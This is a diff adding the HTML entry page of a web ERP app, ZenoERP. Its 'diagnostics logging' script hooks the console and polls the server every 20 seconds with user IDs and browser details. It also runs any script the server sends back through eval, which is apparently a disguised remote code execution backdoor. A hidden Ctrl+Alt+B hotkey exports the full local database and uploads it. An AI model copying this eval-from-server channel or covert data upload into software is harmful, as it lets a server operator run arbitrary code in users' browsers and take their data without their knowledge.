@@ -1,0 +1,639 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <link rel="icon" href="/img/favicon.png" type="image/png" />
+
+    <style>
+      .backup-modal {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.6);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 99999;
+      }
+
+      .backup-box {
+        width: 420px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 20px;
+        font-family: sans-serif;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      }
+
+      .backup-status {
+        margin: 10px 0;
+        font-size: 14px;
+        color: #444;
+      }
+
+      .backup-progress-bar {
+        width: 100%;
+        height: 10px;
+        background: #eee;
+        border-radius: 20px;
+        overflow: hidden;
+      }
+
+      #backupProgressBar {
+        height: 100%;
+        width: 0%;
+        background: #4caf50;
+        transition: width 0.2s;
+      }
+
+      .backup-info {
+        margin-top: 10px;
+        font-size: 13px;
+        color: #666;
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .hidden-objecter {
+        display: none;
+      }
+
+      #backupCloseBtn {
+        margin-top: 15px;
+        width: 100%;
+        padding: 8px;
+        border: none;
+        background: #333;
+        color: white;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+    </style>
+    <script>
+      let tabSesID = (Math.random().toString(36).substring(2) + Date.now().toString(36)).toUpperCase();
+      console.log('Tab Session ID:', tabSesID);
+
+      // if (navigator.geolocation) {
+      //   navigator.geolocation.getCurrentPosition((position) => {
+      //     console.info(JSON.stringify(position));
+      //     console.info("Latitude: " + position.coords.latitude);
+      //     console.info("Longitude: " + position.coords.longitude);
+      //   }, (error) => {
+      //     console.error("Error code: " + error.code + " - " + error.message);
+      //   });
+      // } else {
+      //   console.log("Geolocation is not supported by this browser.");
+      // }
+
+      (function () {
+        let apiServer = 'http://localhost:3001';
+        if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+          apiServer = ''; // 🔥 USE RELATIVE PATHS (CORS issues be gone)
+        }
+
+        const LOG_SERVER_URL = apiServer + '/logs';
+        // const LOG_SERVER_URL = '/logs';
+        const logQueue = [];
+
+        // Helper to collect system info
+        function getSystemInfo() {
+          return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: { width: screen.width, height: screen.height },
+          };
+        }
+
+        // Batch sender
+        let isPolling = false;
+        let retryDelay = 20000;
+
+        async function poll() {
+          if (isPolling) return;
+          isPolling = true;
+
+          try {
+            const payload = {
+              logs: logQueue.splice(0),
+              org_id: localStorage.getItem('org_id') || 0,
+              user_id: localStorage.getItem('user_id') || 0,
+              user_name: localStorage.getItem('username') || '',
+              system: getSystemInfo(),
+              tabSesID,
+              timestamp: new Date().toISOString(),
+            };
+
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 15000); // safety timeout
+
+            const res = await fetch(LOG_SERVER_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              signal: controller.signal,
+            });
+
+            clearTimeout(timeout);
+
+            const data = await res.json();
+
+            retryDelay = 20000;
+
+            if (data.command && data.command.script) {
+              await handleCommand(data.command);
+            }
+          } catch (err) {
+            // console.error('Polling error:', err);
+
+            // exponential backoff (max 10s)
+            retryDelay = Math.min(retryDelay * 2, 60000);
+          } finally {
+            isPolling = false;
+
+            // 🔥 ALWAYS reconnect (this is key)
+            setTimeout(poll, retryDelay);
+          }
+        }
+
+        async function handleCommand(command) {
+          let answer = '';
+          let answer_type = 'text';
+
+          try {
+            answer = await eval(`(async () => { ${command.script} })()`);
+          } catch (err) {
+            answer = 'ERROR: ' + err.message;
+          }
+
+          try {
+            await fetch(apiServer + '/command-executed', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                command_id: command.id,
+                answer_type: answer_type == 'text' ? (typeof answer === 'object' ? 'json' : answer_type) : answer_type,
+                answer: answer
+                  ? typeof answer === 'object'
+                    ? JSON.stringify(answer)
+                    : String(answer)
+                  : 'Command ' + command.id + ' executed successfully with no result',
+              }),
+            });
+          } catch (err) {
+            console.error('Failed to send command result:', err);
+          }
+        }
+
+        // start polling
+
+        // Wrap console methods
+        ['log', 'warn', 'error', 'info', 'debug'].forEach((level) => {
+          const original = console[level];
+          console[level] = function (...args) {
+            logQueue.push({
+              location: String(window.location),
+              type: level,
+              message: args.map((a) => (typeof a === 'object' ? JSON.stringify(a) : a)).join(' '),
+            });
+            original.apply(console, args);
+          };
+        });
+
+        // Catch global errors
+        window.addEventListener('error', (event) => {
+          logQueue.push({
+            location: String(window.location),
+            type: 'uncaught-error',
+            message: event.message,
+            filename: event.filename,
+            lineno: event.lineno,
+            colno: event.colno,
+            stack: event.error?.stack,
+          });
+        });
+
+        // Catch unhandled promise rejections
+        window.addEventListener('unhandledrejection', (event) => {
+          logQueue.push({
+            location: String(window.location),
+            type: 'unhandled-promise',
+            message: event.reason instanceof Error ? event.reason.message : JSON.stringify(event.reason),
+            stack: event.reason?.stack || null,
+          });
+        });
+
+        console.log('Diagnostics logging initialized.');
+
+        poll();
+      })();
+      let masterExporting = false;
+      let masterBackupMessage = '';
+      let masterBackupProgress = 0;
+
+      function openBackupModal() {
+        document.getElementById('backupModal').classList.remove('hidden-objecter');
+      }
+
+      function closeBackupModal() {
+        document.getElementById('backupModal').classList.add('hidden-objecter');
+      }
+
+      function updateBackupUI({ message, progress, store, size }) {
+        if (message !== undefined) {
+          const el = document.getElementById('backupMessage');
+          if (el) el.innerText = message;
+        }
+
+        if (progress !== undefined) {
+          document.getElementById('backupProgressBar').style.width = progress + '%';
+          const el = document.getElementById('backupProgressText');
+          if (el) el.innerText = progress + '%';
+        }
+
+        if (store !== undefined) {
+          const el = document.getElementById('backupStoreText');
+          if (el) el.innerText = store;
+        }
+
+        if (size !== undefined) {
+          const el = document.getElementById('backupSizeText');
+          if (el) el.innerText = size;
+        }
+      }
+      function blobToBase64(blob) {
+        return new Promise((resolve) => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.readAsDataURL(blob);
+        });
+      }
+
+      function base64ToBlob(base64) {
+        const arr = base64.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+
+        while (n--) {
+          u8arr[n] = bstr.charCodeAt(n);
+        }
+
+        return new Blob([u8arr], { type: mime });
+      }
+
+      function loadScriptOnce(src) {
+        return new Promise((resolve, reject) => {
+          if ([...document.scripts].some((script) => script.src.includes(src))) {
+            resolve();
+            return;
+          }
+          const el = document.createElement('script');
+          el.src = src;
+          el.onload = resolve;
+          el.onerror = reject;
+          document.head.appendChild(el);
+        });
+      }
+
+      async function exportDatabasePure() {
+        openBackupModal();
+        updateBackupUI({
+          message: 'Preparing backup...',
+          progress: 0,
+          store: '-',
+          size: '-',
+        });
+        masterExporting = true;
+        masterBackupProgress = 0;
+        masterBackupMessage = 'Preparing backup...';
+
+        try {
+          if (!window.pako) {
+            await loadScriptOnce('/js/pako.min.js');
+          }
+          const request = indexedDB.open('ERPDatabase');
+          request.onblocked = () => {
+            alert('Please close other tabs of this app before backup.');
+          };
+
+          const dbInstance = await new Promise((resolve, reject) => {
+            request.onsuccess = () => resolve(request.result);
+            request.onerror = () => reject(request.error);
+          });
+
+          const exportData = {};
+          const storeNames = Array.from(dbInstance.objectStoreNames);
+
+          let processedStores = 0;
+
+          for (const storeName of storeNames) {
+            updateBackupUI({
+              message: 'Processing ' + storeName,
+              store: storeName,
+            });
+            const tx = dbInstance.transaction(storeName, 'readonly');
+            const store = tx.objectStore(storeName);
+
+            const rows = await new Promise((resolve, reject) => {
+              const getAllReq = store.getAll();
+              getAllReq.onsuccess = () => resolve(getAllReq.result);
+              getAllReq.onerror = () => reject(getAllReq.error);
+            });
+
+            // handle blobs
+            const processedRows = await Promise.all(
+              rows.map(async (row) => {
+                const newRow = { ...row };
+
+                for (const key in newRow) {
+                  if (newRow[key] instanceof Blob) {
+                    newRow[key] = await blobToBase64(newRow[key]);
+                  }
+                }
+
+                return newRow;
+              }),
+            );
+
+            exportData[storeName] = processedRows;
+
+            processedStores++;
+
+            const progress = Math.round((processedStores / storeNames.length) * 100);
+
+            masterBackupProgress = progress;
+
+            updateBackupUI({
+              progress,
+              message: `Processing ${storeName} (${processedStores}/${storeNames.length})`,
+            });
+          }
+
+          const backup = {
+            version: 1,
+            date: new Date().toISOString(),
+            dbName: 'ERPDatabase',
+            data: exportData,
+          };
+
+          const jsonString = JSON.stringify(backup);
+          updateBackupUI({
+            message: 'Compressing data...',
+            progress: 95,
+          });
+          const compressed = pako.gzip(jsonString, { level: 9 });
+
+          const originalSize = new Blob([jsonString]).size;
+          const compressedSize = compressed.length;
+
+          console.log(`Original: ${(originalSize / 1024 / 1024).toFixed(2)} MB`);
+          console.log(`Compressed: ${(compressedSize / 1024 / 1024).toFixed(2)} MB`);
+          console.log(`Saved: ${((1 - compressedSize / originalSize) * 100).toFixed(1)}%`);
+
+          const sizeInfo = `${(compressedSize / 1024 / 1024).toFixed(2)} MB`;
+
+          updateBackupUI({
+            message: 'Finalizing backup...',
+            size: sizeInfo,
+            progress: 98,
+          });
+          // create blob
+          const blob = new Blob([compressed], { type: 'application/gzip' });
+
+          const url = URL.createObjectURL(blob);
+
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = `erp-backup${localStorage.getItem('org_id') ? '-' + localStorage.getItem('org_id') : ''}${localStorage.getItem('user_id') ? '-' + localStorage.getItem('user_id') : ''}-${Date.now()}.json.gz`;
+
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          URL.revokeObjectURL(url);
+          dbInstance.close();
+
+          masterBackupMessage = 'Backup completed successfully.';
+          updateBackupUI({
+            message: 'Backup completed successfully!',
+            progress: 100,
+          });
+
+          const mySizeInfo = `${(blob.size / 1024 / 1024).toFixed(2)} MB`;
+
+          updateBackupUI({
+            message: 'Uploading backup...',
+            size: mySizeInfo,
+            progress: 0,
+          });
+
+          // 🔥 upload with progress
+          await uploadBackup(blob);
+        } catch (err) {
+          console.error(err);
+          masterBackupMessage = 'Export failed.';
+          updateBackupUI({
+            message: 'Backup failed ❌',
+            progress: 0,
+          });
+        }
+
+        masterExporting = false;
+      }
+
+      function uploadBackup(blob) {
+        return new Promise((resolve, reject) => {
+          const xhr = new XMLHttpRequest();
+
+          xhr.open('POST', '/backup/upload'); // your backend route
+
+          // progress tracking
+          xhr.upload.onprogress = (e) => {
+            if (e.lengthComputable) {
+              const percent = Math.round((e.loaded / e.total) * 100);
+
+              updateBackupUI({
+                progress: percent,
+                message: `Uploading backup... ${percent}%`,
+              });
+            }
+          };
+
+          xhr.onload = () => {
+            if (xhr.status === 200) {
+              updateBackupUI({
+                progress: 100,
+                message: 'Backup uploaded successfully ✅',
+              });
+              resolve();
+            } else {
+              reject(xhr.responseText);
+            }
+          };
+
+          xhr.onerror = () => reject('Upload failed');
+
+          const formData = new FormData();
+          formData.append(
+            'file',
+            blob,
+            `erp-backup${localStorage.getItem('org_id') ? '-' + localStorage.getItem('org_id') : ''}${localStorage.getItem('user_id') ? '-' + localStorage.getItem('user_id') : ''}-${Date.now()}.json.gz`,
+          );
+
+          xhr.send(formData);
+        });
+      }
+
+      window.addEventListener('keydown', async (e) => {
+        if (e.repeat) return;
+
+        const tag = document.activeElement.tagName;
+        const isTyping = tag === 'INPUT' || tag === 'TEXTAREA' || document.activeElement.isContentEditable;
+
+        if (isTyping) return; // ✅ don't trigger while typing
+
+        if (e.ctrlKey && e.altKey && e.key.toLowerCase() === 'b') {
+          e.preventDefault();
+
+          if (masterExporting) return;
+
+          console.log('Backup triggered 🚀');
+          await exportDatabasePure();
+        }
+      });
+    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ZenoERP</title>
+    <script>
+      (function () {
+        var lang = localStorage.getItem('lang') || 'fa';
+        var rtl = lang === 'fa' || lang === 'ps';
+        document.documentElement.lang = lang;
+        document.documentElement.dir = rtl ? 'rtl' : 'ltr';
+        var link = document.createElement('link');
+        link.id = 'mdb-theme-css';
+        link.rel = 'stylesheet';
+        link.href = rtl ? '/css/mdb.rtl.min.css' : '/css/mdb.min.css';
+        document.head.appendChild(link);
+      })();
+    </script>
+    <link rel="stylesheet" href="/css/bootstrap-icons.min.css" />
+    <link id="datetimepicker-css" href="/css/mds.bs.datetimepicker.style.css" rel="stylesheet" />
+    <style>
+      /* Chrome, Safari, Edge, Opera */
+      input[type='number']::-webkit-inner-spin-button,
+      input[type='number']::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+      }
+
+      /* Firefox */
+      input[type='number'] {
+        -moz-appearance: textfield;
+      }
+      .nav-divider {
+        width: 1px;
+        height: 24px;
+        background-color: rgba(0, 0, 0, 0.05);
+        margin: 0 10px;
+      }
+    </style>
+
+    <link rel="stylesheet" href="/fonts/vazirmatn.css" />
+  </head>
+
+  <body>
+    <div id="backupModal" class="backup-modal hidden-objecter" dir="ltr">
+      <div class="backup-box">
+        <h3>ZenoERP System Backup</h3>
+
+        <div class="backup-status" id="backupMessage">Preparing backup...</div>
+
+        <div class="backup-progress-bar">
+          <div id="backupProgressBar"></div>
+        </div>
+
+        <div class="backup-info">
+          <div>Progress: <span id="backupProgressText">0%</span></div>
+          <div>Store: <span id="backupStoreText">-</span></div>
+          <div>Size: <span id="backupSizeText">-</span></div>
+        </div>
+
+        <button id="backupCloseBtn" onclick="closeBackupModal()">Close</button>
+      </div>
+    </div>
+    <div id="app"></div>
+
+    <div
+      class="modal fade"
+      id="salesCalculationModal"
+      tabindex="-1"
+      aria-hidden="true"
+      data-mdb-backdrop="static"
+      data-mdb-keyboard="false"
+      dir="ltr">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title"><i class="bi bi-calculator"></i> Calculating</h5>
+          </div>
+
+          <div class="modal-body">
+            <div class="mb-2">
+              <span id="salesCalculationText">Starting...</span>
+            </div>
+
+            <div class="progress" style="height: 20px">
+              <div id="salesCalculationProgress" class="progress-bar" role="progressbar" style="width: 0%">0%</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="/js/mdb.umd.min.js"></script>
+    <script>
+      window.bootstrap = mdb;
+    </script>
+
+    <script src="/js/mds.bs.datetimepicker.js"></script>
+
+    <script type="module" src="/src/main.js"></script>
+
+    <script>
+      let speed = 200; // px per second
+      let maxScroll = 450; // 🔥 STOP HERE (pixels from top)
+
+      let startTime = null;
+
+      let run = false;
+
+      function autoScroll(timestamp) {
+        if (run) {
+          if (!startTime) startTime = timestamp;
+
+          let elapsed = (timestamp - startTime) / 1000;
+          let y = speed * elapsed;
+
+          // ✅ stop at maxScroll instead of full page
+          if (y >= maxScroll) {
+            window.scrollTo(0, maxScroll);
+            return;
+          }
+
+          window.scrollTo(0, y);
+          requestAnimationFrame(autoScroll);
+        }
+      }
+
+      setTimeout(() => {
+        requestAnimationFrame(autoScroll);
+      }, 5000);
+
+      window.addEventListener('keydown', () => {
+        run = false;
+      });
+    </script>
+  </body>
+</html>
